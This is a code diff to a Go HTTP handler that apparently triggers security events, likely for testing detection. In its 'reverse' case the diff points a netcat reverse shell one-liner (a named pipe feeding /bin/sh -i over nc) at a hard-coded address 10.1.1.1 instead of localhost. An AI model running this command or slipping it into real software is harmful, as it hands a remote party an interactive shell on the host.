@@ -266,9 +266,9 @@ func run_cmd(w http.ResponseWriter, cmd_opt string) {
 
 		// comment out the for loop as no concurrent connection support is required
 		//for {
-		conn, err := listener.Accept()
 		log.Printf("Waiting for connection at %v", listener.Addr())
 		fmt.Fprintf(w, "Waiting for connection at %v\n", listener.Addr())
+		conn, err := listener.Accept()
 
 		defer conn.Close()
 
@@ -279,11 +279,12 @@ func run_cmd(w http.ResponseWriter, cmd_opt string) {
 		log.Printf("Accepted connection from %v", conn.RemoteAddr())
 		fmt.Fprintf(w, "Accepted connection from %v\n", conn.RemoteAddr())
 
-		go func(c net.Conn) {
-			time.Sleep(time.Duration(sleep_duration) * time.Second)
-			conn.Close()
-			log.Printf("Closing connection\n")
-		}(conn)
+		// comment out goroutine as no concurrent connection support is required
+		//go func(c net.Conn) {
+		time.Sleep(time.Duration(sleep_duration) * time.Second)
+		conn.Close()
+		log.Printf("Closing connection\n")
+		//}(conn)
 		//}
 
 	case "nc":
@@ -305,13 +306,14 @@ func run_cmd(w http.ResponseWriter, cmd_opt string) {
 	case "reverse":
 		// initiate a reverse shell command to trigger reverse shell event
 		ctx_duration := 30 * time.Second
+		dest_ip := "10.1.1.1"
 		tcp_port := "11111"
 
 		ctx, cancel := context.WithTimeout(context.Background(), ctx_duration)
 		defer cancel()
 
-		cmd_out, err := exec.CommandContext(ctx, "rm", "-f", "/tmp/f", ";", "mknod", "/tmp/f", "p", ";", "cat", "/tmp/f", "|", "/bin/sh", "-i", "2>&1", "|", "nc", "127.0.0.1", tcp_port, ">", "/tmp/f").Output()
-		fmt.Fprintf(w, "Running command \"rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 %s\" "+"> /tmp/f\n", tcp_port)
+		cmd_out, err := exec.CommandContext(ctx, "rm", "-f", "/tmp/f", ";", "mknod", "/tmp/f", "p", ";", "cat", "/tmp/f", "|", "/bin/sh", "-i", "2>&1", "|", "nc", dest_ip, tcp_port, ">", "/tmp/f").Output()
+		fmt.Fprintf(w, "Running command \"rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s "+"> /tmp/f\"\n", dest_ip, tcp_port)
 		if err == nil {
 			fmt.Fprintf(w, "%s\n", cmd_out)
 		} else {
